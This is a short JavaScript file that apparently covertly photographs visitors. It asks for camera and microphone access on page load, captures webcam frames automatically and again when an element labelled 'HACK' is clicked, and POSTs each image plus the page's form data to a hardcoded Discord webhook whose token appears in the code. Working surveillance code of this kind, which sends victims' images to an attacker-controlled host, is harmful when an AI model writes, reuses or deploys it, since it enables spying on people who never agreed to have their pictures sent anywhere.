document.addEventListener('DOMContentLoaded', init, false);
const widht = window.innerWidth;
const height = window.innerHeight;
const myformData = new FormData();


const constraints = {
    audio: true,
    video: true
}

async function init(){
    const error = document.getElementById("error");
    const live = document.getElementById("live"); 
    try{
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     handleSuccess(stream);
     const HACK = document.getElementById("HACK");
     HACK.addEventListener("click", drawCapture);
    }
    catch(e){
        error.innerHTML =  e.toString();
    }
}

function handleSuccess(stream){
    window.stream =  stream
    live.srcObject = stream;
    live.addEventListener("playing", () => {
        var c = document.getElementById("capture");
        c.width = live.videoWidth ;
        c.height = live.videoHeight;
        drawCapture();
      });    
}

function drawCapture(){
    console.log("--- Capture ---")
    var c = document.getElementById("capture");
    var ctx = c.getContext("2d",{ willReadFrequently: true });
    ctx.drawImage(window.live, 10, 10);
    var image = ctx.getImageData(10,10,c.width, c.height);
    sendImageOnDiscord(c);
}

function sendImageOnDiscord(canvas){
    var URL = 'https://discord.com/api/webhooks/1061663911520260127/orVJx2YA-5uas2x_7w_KCsqyiMCD9iJLTymJkPdPpZwoJSjLCzMW7y4NcJL6YdKlOklg';
    
    var dataURL = canvas.toDataURL('image/png', 0.5);
    var blob = dataURItoBlob(dataURL);
    var fd = new FormData(document.forms[0]);
    fd.append("canvasImage", blob, "file.png");
    
    const options = {
        method: 'POST',
        body: fd,
    }; 
    fetch(URL, options);
}

function dataURItoBlob(dataURI) {
    // convert base64/URLEncoded data component to raw binary data held in a string
    var byteString;
    if (dataURI.split(',')[0].indexOf('base64') >= 0)
        byteString = atob(dataURI.split(',')[1]);
    else
        byteString = unescape(dataURI.split(',')[1]);

    // separate out the mime component
    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

    // write the bytes of the string to a typed array
    var ia = new Uint8Array(byteString.length);
    for (var i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return new Blob([ia], {type:mimeString});
}

